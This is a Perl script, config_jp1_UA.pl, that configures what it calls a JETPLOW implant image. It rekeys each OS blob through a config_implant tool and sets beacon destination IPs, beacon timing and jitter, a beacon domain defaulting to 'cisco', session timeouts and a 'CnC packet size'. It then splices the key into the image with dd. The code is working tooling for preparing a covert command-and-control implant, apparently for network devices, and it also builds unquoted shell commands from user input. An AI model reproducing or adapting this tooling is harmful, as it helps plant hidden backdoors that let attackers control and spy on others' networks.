#! /usr/bin/perl

use bytes;
use Getopt::Std;

sub my_swap 
{

  my($my_in) = @_;

  $my_out = ( ($my_in & 0xff) << 24 );
  $my_out |= ( (($my_in >>  8) & 0xFF) << 16 );
  $my_out |= ( (($my_in >> 16) & 0xFF) << 8  );
  $my_out |= ( (($my_in >> 24) & 0xFF) );

  return $my_out;
};

getopts("f:k:b:l:c:p:s:m:x:t:h:d:n:");

if(!defined($opt_f))
{
	print qq~
Usage: config_jp1_UA.pl -f <Jetplow UserArea file> -k <key file> [-c <beacon count> -b <first beacon IP> -l <Second beacon IP> -p <primary delay> -s <seconday delay> -m <min rand> -x <max rand> -d <domain name> -t <sesion timeout> -h <hello timeout> -n <benignsize>] 

This program will configure a JETPLOW Userarea file. The configurable parts are the key
for the implant (and thus the Implant ID), and optionally the beacon parameters and
timeout values. If the optionally values are not used then the defaults listed below will
be used. 

NOTE:  IT ASSUMES YOU ARE OPERATING IN THE INSTALL/LP/JP DIRECTORY. THIS ASSUMPTION 
IS CRUCIAL TO GET THE PROPER DAT FILES FOR THE CONFIGURATION AND THE PROGRAM CONFIG_IMPLANT.

-f <Jetplow UserArea File>	The name and location of the JETPLOW UserArea file

-k <key file>			The name and location of the key file for reconfiguring
				the UserArea

-c <beacon count>		Maximum beacons to send. Must be <= 1000 [0]

-b <first beacon IP>		First IP address for beacon destination [127.0.0.1]

-l <second beacon IP>		Second IP address for beacon destination [127.0.0.1]

-p <primary delay>		Number of seconds before initial beacon. [0]

-s <secondary delay> 		Number of seconds between secondary beacons. [0]

-m <minimum rand>		Minimum number of seconds added to beacon delay. [0]

-x <max rand>			Maximum number of seconds added to beacon delay [0]

-t <session timeout>		Number of minutes before session timeout. [5]

-h <hello timeout>		Number of minutes before hello timeout [1]

-n <benignsize>			The maximum CnC packet size. [512]

~;
	exit;
}

#set the default address offsets in the userarea file
@addresses = (	"0xaf10", "0xb15a", "0xb3a4",
		"0xb5ee", "0xb838", "0xba82",
		"0xbccc", "0xbf16", "0xc165",
		"0xc3b4", "0xc603", "0xc852");

#test that we have the minimum parameters
(($opt_f)&&($opt_k)) or die "Usage: config_jp1_UA.pl -f <Jetplow UserArea file> -k <key file> [Options] or just config_jp1_UA.pl for detail Usage";

if($opt_k)
{
# Read the key from the key file and get it into the right format
# Open the key file
	open(KEY, $opt_k) or die "Can't open $opt_k\n";
#read some fluff
	read(KEY, $bufid, 8);
#read the first part of the key
	read(KEY, $buf, 20);
#start formating $buf properly
	$buf = $buf . "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
# get the rest of the key
	read(KEY, $buf2, 24);
# open a file for printing
	open(OUT, "> temp.key") or die "Can't open temp.key \n";
	print OUT "$buf$buf2";
	close(KEY);
	close(OUT);
}

# are we changing the first beacon IP
if(!$opt_b) 
{
  $opt_b = "127.0.0.1";
}

# are we changing the second beacon IP
if(!$opt_l) 
{
  $opt_l = "127.0.0.1";
}

# are we changing the beacon count
if(!$opt_c)
{
 $opt_c = "0";
}

# are we changing the beacon primary delay
if(!$opt_p)
{
 $opt_p = "0";
}

# are we changing the beacon secondary delay
if(!$opt_s)
{
 $opt_s = "0";
}

# are we changing the beacon minimum random delay
if(!$opt_m)
{
 $opt_m = "0";
}

# are we changing the beacon maximum random delay
if(!$opt_x)
{
 $opt_x = "0";
}

# are we changing the session timeout value
if(!$opt_t)
{
 $opt_t = "5";
}

# are we changing the hello timeout value
if(!$opt_h)
{
 $opt_h = "1";
}

# are we changing the benignsize
if(!$opt_n)
{
 $opt_n = "512";
}

# are we changing the beacon domain
if(!$opt_d)
{
 $opt_d = "cisco";
}

# open the userarea file for reading
open ( USERAREA, $opt_f) or die "open:$!";;

# skip to the address of the blobs
$address = 16;
seek(USERAREA, $address, 0) or die "seek1:$!";

# read the address of the blobs
read(USERAREA, $result, 4) or die "read1:$!";

# get it as an integer
$addr = my_swap( vec($result, 0, 32));

if (!$addr)
 {
   printf "There are no OS blobs in this userarea file exiting\n";
   exit;
 }

# seek to the beginning of the blob area
seek(USERAREA, $addr, 0) or die "seek2:$!";

# read the first 8 bytes of the struct
read(USERAREA, $result, 8) or die "read2:$!";

# get the magic and size to the next struct
$magic = my_swap(vec($result, 0, 32));
$blob_size = my_swap ( vec($result, 1, 32));

while( ($magic == 0xba9a61ee) && ($blob_size != 0) )
{
  # get the address of this blob
  $blob_addr = $addr + 0x20;

  # get the address of the next putative blob
  $addr = $addr + $blob_size; 

  #operate on this blob
# run config_implant to get the OS version
   $blob_addr = sprintf "0x%08x", $blob_addr;

   print "../../Build/config_implant -f $opt_f -a $blob_addr\n";

   @output = `../../Build/config_implant -f $opt_f -a $blob_addr 2>&1 `;

   if (!@output)
   {
    printf "Error running config_implant.\n";
    printf "Are you in the Install/LP/JP directory?\n";
    exit;
   }
#error check the output
   foreach (@output)
   {
     if (/Usage:/)
     {
       print STDERR "@output";
       exit;
     }
   }

# for each line of the output
   foreach (@output)
   {
# test for the string "OS Version"
     if (/OS Version\s+:\s+0x([0-9a-fA-F]{3,})/)
      { 
# put the OS ver in a variable
        $osver = $1;
	last;
      }
   }

#get the dat file name
$osver_len = length $osver;
if ($osver_len == 3)
{
   $dat = "../../Dats/00000$osver.dat";
}
elsif ($osver_len == 8)
{
   $dat = "../../Dats/$osver.dat";
}
else
{ 
  print STDERR "Error on osver %s\n";
  exit;
};


#now rekey the memory blob

   print "../../Build/config_implant -f $opt_f -k $opt_k -a $blob_addr -b $opt_b -l $opt_l -c $opt_c -p $opt_p -s $opt_s -m $opt_m -x $opt_x -t $opt_t -h $opt_h -d $opt_d -n $opt_n --vers $dat \n";

   @output = `../../Build/config_implant -f $opt_f -k $opt_k -a $blob_addr -b $opt_b -l $opt_l -c $opt_c -p $opt_p -s $opt_s -m $opt_m -x $opt_x -t $opt_t -h $opt_h -d $opt_d -n $opt_n --vers $dat 2>&1`;

   if (!@output)
   {
    printf "Error running config_implant.\n";
    printf "Are you in the Install/LP/JP directory?\n";
    exit;
   }
#error check the output
   foreach (@output)
   {
     if (/Error:/)
     {
       print STDERR "@output";
       exit;
     }
   }

  # seek to the beginning of the next blob area
  seek(USERAREA, $addr, 0) or die "seek3$!";

  # read the first 8 bytes of the struct
  read(USERAREA, $result, 8) or die "read3:$!";

  # get the magic and size of the next struct
  $magic = my_swap (vec($result, 0, 32));
  $blob_size = my_swap (vec($result, 1, 32));


} # end of the while $addr 
# now that the image blobs are all rekeyed we need to rekey the PBD part
# the correct key is in a file called temp.key
# read it and maybe do a dd to get it in the right place?

# skip to the address of the PBD area
$address = 8;
seek(USERAREA, $address, 0) or die "seek3:$!";
                                                                                                                                                     
# read the address of the blobs
read(USERAREA, $result, 4) or die "read3:$!";
                                                                                                                                                     
if ($result == 0)
 { exit 0; };

# get it as an integer
$addr = my_swap( vec($result, 0, 32));
if($addr > 0){
  $pbd_key = $addr + 10;
  `cp $opt_f temp.bin`;

  `dd if=temp.bin of=part1 bs=1 count=$pbd_key`;
  $skip_val = $pbd_key + 76;
  print stdout "$pbd_key $skip_val\n";
  `dd if=temp.bin of=part2 bs=1 skip=$skip_val`;
  `cat part1 temp.key part2 > new_ua.bin`;
  `cp new_ua.bin $opt_f`;
  `rm part1 part2 new_ua.bin`;
}
`rm temp.key`;

